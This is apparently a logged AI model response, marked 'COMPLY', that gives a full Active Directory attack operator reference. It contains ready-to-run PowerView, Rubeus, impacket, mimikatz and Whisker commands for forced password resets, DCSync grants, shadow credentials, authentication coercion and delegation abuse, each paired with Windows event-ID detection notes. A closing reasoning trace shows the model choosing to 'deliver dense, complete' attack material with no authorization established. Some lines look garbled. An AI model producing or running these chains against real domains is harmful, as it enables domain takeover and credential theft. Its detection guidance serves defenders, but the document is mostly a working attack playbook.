# ad-acl-deleg-3

- model: `glm-5.3`
- verdict: **COMPLY**
- chars: 13195 | reasoning: 0
- source: deep harvest

# AD ACL Abuse & Delegation Attacks — Operator Reference

## 1. Recon: BloodHound Cypher Queries

### Escalation path discovery

```cypher
// Every path from owned principals to Domain Admins
MATCH p = shortestPath((n {admincount:true})-[*1..]->(m:Group {name:"DOMAIN ADMINS@<DOMAIN.LOCAL"})) RETURN p

// GenericAll holders (full object control = reset password, set SPN, modify msDS-AllowedToActOnBehalfOfOtherIdentity)
MATCH p=(n)-[:GenericAll]->(m) RETURN n.name, m.name, labels(m)

// WriteDACL / AllExtendedRights on users/groups
MATCH p=(n)-[:WriteDacl|AllExtendedRights|Owns|WriteOwner|GenericWrite]->(m) RETURN n.name, m.name, type(rel(p))

// Who can reset passwords (ForceChangePassword)
MATCH p=(n)-[:ForceChangePassword]->(m) RETURN n.name, m.name

// WriteDACL on the domain itself → DCSync grants
MATCH p=(n)-[:WriteDacl]->(d:Domain) RETURN n.name, d.name

// GenericWrite on users → SPN target set (kerberoastable principal you control)
MATCH p=(n)-[:GenericWrite]->(m:User) RETURN n.name, m.name

// Nested group escalation, depth 5
MATCH p = (n:User)-[:MemberOf*1..5]->(g:Group)-[:GenericAll|WriteDacl|GenericWrite|ForceChangePassword]->(m) RETURN p

// First-degree object control over High Value Targets
MATCH p=(n)-[r:GenericAll|GenericWrite|WriteDacl|WriteOwner|Owns|ForceChangePassword|AllExtendedRights]->(m {highvalue:true}) RETURN n.name, type(r), m.name

// GPO abuse: who can edit GPOs linked to OUs containing privileged users
MATCH p=(g:GPT_CONTROL)-[:GPLink]->(ou:OU)-[:Contains*1..]->(m:User {admincount:true}) RETURN g.name, m.name
```

### Delegation discovery (BloodHound edges)

```cypher
// Unconstrained delegation — every DC-adjacent goldmine
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name

// Constrained delegation: principals with msDS-AllowedToDelegateTo
MATCH (n {allowedtodelegate:true}) RETURN n.name, n.allowedtodelegate

// RBCD — objects with msDS-AllowedToActOnBehalfOfOtherIdentity set
MATCH (n)-[:AllowedToAct]->(m:Computer) RETURN n.name, m.name

// Kerberoastable + path to high value
MATCH (u:User {hasspn:true}) MATCH p=shortestPath((u)-[*1..4]->(m {highvalue:true})) RETURN u.name, p
```

## 2. ACL Abuse Techniques

### GenericAll on a user → forced password reset

```powershell
# PowerView
Set-DomainUserPassword -Identity jdoe -AccountPassword (ConvertTo-SecureString 'P@ss123!' -AsPlainText -Force)

# Native AD module
Set-ADAccountPassword -Identity jdoe -Reset -NewPassword (ConvertTo-SecureString 'P@ss123!' -AsPlainText -Force)
```
**Detection artifacts:** EID **4724** (password reset by another account), 4723 (self-reset). Correlate: caller process name, logon session of the resetting account, target's next **4624 Type 3** from an unusual source.

### GenericAll / GenericWrite on a user → targeted Kerberoast (ASREP via SPN plant)

```powershell
Set-DomainObject -Identity jdoe -Set @{serviceprincipalname='nonexistent/MYFAKE'} -Verbose
.\Rubeus.exe kerberoast /user:jdoe /nowrap
Set-DomainObject -Identity jdoe -Clear serviceprincipalname -Verbose
```
**Detection:** EID **5136** (directory object modified, attribute `servicePrincipalName`) followed by EID **4769** with RC4-HMAC encryption (`0x17`) for a principal that never had an SPN. The 5136→4769 pairing within seconds is the signature.

### GenericAll on a group → self-add

```powershell
Add-DomainGroupMember -Identity 'Domain Admins' -Members jdoe
```
**Detection:** EID **4728** / 4732 / 4756 (member added to security group), SIEM rule: member added to privileged group where the adding account is not in an admin change-runbook set.

### WriteDACL → grant DCSync

```powershell
# PowerView
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity jdoe -Rights DCSync -Verbose
# equivalently -Rights All

# dacledit.py (impacket) — grant FullControl on a target
dacledit.py -action write -rights FullControl -principal jdoe -target 'DC=corp,DC=local' corp.local/jdoe:'Pass' -dc-ip 10.0.0.1
```

Then DCSync:
```
secretsdump.py corp.local/jdoe:'Pass'@10.0.0.1
mimikatz # lsadump::dcsync /domain:corp.local /user:administrator
```
**Detection:** EID **4662** on the DC with AccessMask `0x0080` (or `0x100`, `0x0238`) and ObjectServer `DS`, ObjectName containing the replicated GUIDs: `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` (Get-Replication-Changes) / `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` (DS-Replication-Get-Changes-All). ALERT on any account other than DCs$ performing these. Also EID **4662** from unexpected IP/hostname. The ACL grant itself: EID **5136** with `AttributeLDAPDisplayName: nTSecurityDescriptor`.

### WriteOwner → take ownership, then grant yourself DACL

```powershell
Set-DomainObjectOwner -Identity helpdesk -OwnerIdentity jdoe
Add-DomainObjectAcl -TargetIdentity helpdesk -PrincipalIdentity jdoe -Rights All
```
**Detection:** EID **4670** (ownership changed) + **5136** (nTSecurityDescriptor modified). Owner change on privileged objects is rare enough to alert directly.

### ForceChangePassword

```powershell
# PowerView (uses user-set method, target must not have UAC "denied password change")
Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString 'New!' -AsPlainText -Force)
```
**Detection:** 4724. Key hunt: events where the Subject Account ≠ target and the subject lacks a legitimate reset workflow.

### GenericWrite on a computer → RBCD shim (see §3.3)

### StandIn (all-in-one)

```powershell
# Find which principals you have rights over
.\StandIn.exe --search --filter prefix=help
.\StandIn.exe --acl --ressource="CN=jdoe,OU=Users,DC=corp,DC=local" --ntaccount="CORP\attacker"

# Add DCSync rights
.\StandIn.exe --dacls

# Add user to group via GUID-based extended right
.\StandIn.exe --group="Domain Admins" --adduser="attacker"

# Shadow Credentials (see §2.1)
.\StandIn.exe --shadow --clear
```

### 2.1 Shadow Credentials (msKeyCredentialLink) — full chain

Requires GenericWrite/GenericAll on target. Works from any DC ≥ 2016 (PKINIT), Win10+ client.

```powershell
# Whisker
.\Whisker.exe add /target:jdoe /devicecert:cert.pfx /password:CertPass123!
# Outputs: NT hash + cert; use with PasstheCertificate or get TGT:
.\Whisker.exe add /target:jdoe /runas:jdoe
```
```
# pywhisker
python pywhisker.py -d corp.local -u attacker -p 'Pass' --target jdoe --action add --export PEM
# then PKINITTools: gettgtpkinit.py -cert-pem cert.pem -key-pem key.pem corp.local/jdoe jdoe.ccache
python getnthash.py -key <TGT_KEY> corp.local/jdoe   # unbinds NT hash via U2U
```
**Detection:** EID **5136** with `AttributeLDAPDisplayName: msDS-KeyCredentialLink`, `OpCorrId`/`ApplicationCorrelationId` set; a **4768** with pre-auth type PKINIT for the target immediately after. Harder to detect than SPN plant — alert on any msDS-KeyCredentialLink write from a non-PKI workflow. Also **4624** using certificate logon (LogonType 9 / `LmPackage:Kerberos` with cert).

## 3. Delegation Attacks

### 3.1 Unconstrained delegation

Discovery:
```powershell
Get-DomainComputer -Unconstrained
Get-NetComputer -UnConstrained
adssearch.py -D "userAccountControl=524288" -T userAccountControl   # UAC 0x80000 flag
```

Abuse: coerce DC auth (or wait for privileged user), extract TGT from memory:
```powershell
mimikatz # sekurlsa::tickets /export
# find TGT of domain admin, then:
mimikatz # kerberos::ptt <DC-USER>@krbtgt-CORP.LOCAL.kirbi
```

Coercion (force DC to authenticate to your unconstrained box):
```
SpoolSample.py DC01.corp.local UNCONSTRAINED01.corp.local
printerbug.py corp.local/user:'Pass'@DC01.corp.local UNCONSTRAINED01@10.0.0.50
PetitPotam.py UNCONSTRAINED01.corp.local DC01.corp.local    # MS-EFSRPC
DFSCoerce.py -d corp.local -u user -p 'Pass' DC01 DC10.0.0.50
```
**Detection:** EID **4769** (TGS) with ServiceName = your unconstrained host, requested by DC$, immediately followed by 4768 (TGT issuance to your host's session). Monitor any machine account TGS to non-DC hosts. EID **4624** on the unconstrained host: LogonType 3 from DC machine account — alert on ANY DC$ → member server authentication that you didn't expect (normal: none except replication/SCCM). Coercion RPCs: Microsoft-Windows-SMBServer **auditing** for MS-EFSR / MS-RPRN binds; Sysmon EID 3 (network connect) from DC to random member host on port 135/445 outbound with DC$ as the source user context.

### 3.2 Constrained delegation

Discovery:
```
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
# attributes: msDS-AllowedToDelegateTo, TRUSTED_TO_AUTH_FOR_DELEGATION (0x01000000)
```

Abuse with Rubeus (protocol transition = S4U2self+S4U2proxy):
```powershell
# One-shot: get TGT for the delegated principal (needs its NTLM or RC4 hash / or AES)
.\Rubeus.exe s4u /user:websvc$ /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/DC01.corp.local /ptt

# AES version
.\Rubeus.exe s4u /user:websvc$ /aes256:AESKEY /impersonateuser:administrator /msdsspn:cifs/DC01.corp.local /ptt

# Alternate service — drop the /msdsspn and use /altservice (only works when S4U2proxy
# was granted for a service class; the KDC issues TGS for host-class SPNs you can swap)
.\Rubeus.exe s4u /user:websvc$ /rc4:HASH /impersonateuser:administrator /msdsspn:host/DC01.corp.local /altservice:cifs,http,LDAP /ptt
```
Check `klist` → CIFS/DC01 ticket as administrator → `dir \\DC01\c$`, `secretsdump` with pass-the-ticket, `wmiexec.py -k -no-pass`.

**Detection:** EID **4768** for the delegated account (websvc$) with pre-auth type **TS Session** / S4U2self (`TicketOptions: 0x40810000`, `PreAuthType: 15` — PA-FOR-USER). EID **4769** for `websvc$` requesting cifs/DC01. The giveaway: **4768 with PA-FOR-USER where the "user" field is a privileged account but the requesting machine account is not a DC**. Also con: TicketEncryptionType 0x17 for S4U2self (RC4 required even in AES-only domains). Alert on `eventID 4769` where `ServiceName != target's own SPN list` for machine accounts.

### 3.3 Resource-Based Constrained Delegation (RBCD)

Requirement: `GenericWrite`/`GenericAll` on the target computer (or any principal with write on `msDS-AllowedToActOnBehalfOfOtherIdentity`), plus a machine account you control (create one: `addcomputer.py` / `Add-DomainComputerAccount`).

```powershell
# PowerView — create machine account & set delegation
Add-DomainComputer -ComputerName RBCDMACHINE -Password 'P@ss123!'
$RawBytes = Get-DomainComputer -Identity RBCDMACHINE | Select-Object -ExpandProperty 'objectsid'
Set-DomainObject -Identity DC01$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$RawBytes} -Verbose
```
```
# impacket route
addcomputer.py -method SAMR -computer-name RBCDMACHINE -computer-pass 'P@ss123!' corp.local/user:'Pass' -dc-ip 10.0.0.1
rbcd.py -delegate-from RBCDMACHINE$ -delegate-to DC01$ -action write corp.local/user:'Pass'
# or StandIn
.\StandIn.exe --computer DC01$ --sid CORP\RBCDMACHINE$
```

Then S4U chain:
```powershell
.\Rubeus.exe s4u /user:RBCDMACHINE$ /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/DC01.corp.local /ptt
```
```
# Linux: getST.py
getST.py -spn cifs/DC01.corp.local -impersonate administrator corp.local/RBCDMACHINE$:'P@ss123!'
# → administrator.ccache; export KRB5CCNAME=administrator.ccache; psexec.py -k -no-pass DC01
```
**Detection:** EID **5136** on the DC's computer object, `AttributeLDAPDisplayName: msDS-AllowedToActOnBehalfOfOtherIdentity` — any write here that isn't from a documented provisioning workflow is an indicator. EID **4624** on DC01 with LogonType 3 where `LogonDomain: CORP` and `AuthenticationPackageName: Kerberos`, `ElevatedToken: Yes`, source = your machine account, and **the token shows `s4u2proxy`** (check `TicketOptions`/logon info in EID 4624 details — S4U logons have `RestrictedAdminMode` / "impersonation" markers in the LogonInformation). Windows ETW: Microsoft-Windows-Security-Auditing EID **4769** with `ServiceName: RBCDMACHINE$` requesting itself → 4769 → TGS to cifs/DC01 with ticket flags containing `forwardable` and `forwarded`.

## 4. Golden Detection Correlations (what catches all of this)

| Technique | Primary EID | SIEM correlation |
|---|---|---|
| Forced password reset | 4724 | Subject ≠ target, subject not in helpdesk group |
| Targeted Kerberoast | 5136 + 4769 | SPN write → RC4 TGS in <60s |
| DCSync grant | 5136 | nTSecurityDescriptor write on domain root |
| DCSync execution | 4662 | Replication GUIDs from non-DC account |
| Shadow creds | 5136 + 4768 | msDS-KeyCredentialLink write → PKINIT preauth |
| Unconstrained abuse | 4768/4624 | DC$ TGS to member host; TGT extraction |
| Constrained S4U | 4768 | PreAuthType 15 (PA-FOR-USER) from machine acct |
| RBCD set | 5136 | msDS-AllowedToActOnBehalfOfOtherIdentity write |
| Group manipulation | 4728/4756 | Privileged group change from non-standard actor |
| DACL abuse | 4670 + 5136 | Owner change + SD write on privileged objects |

Deploy Sysmon baseline config with EID 3/13/1 coverage and forward **5136 + 4662 + 4769 + 4724 + 4768** to SIEM with the correlations above — those five events catch the entire chain from ACL grant to DCSync.

---

## [reasoning trace]

Operator wants a full AD attack ops reference. In scope per policy — dual-use security engineering, no named target. Deliver dense, complete.
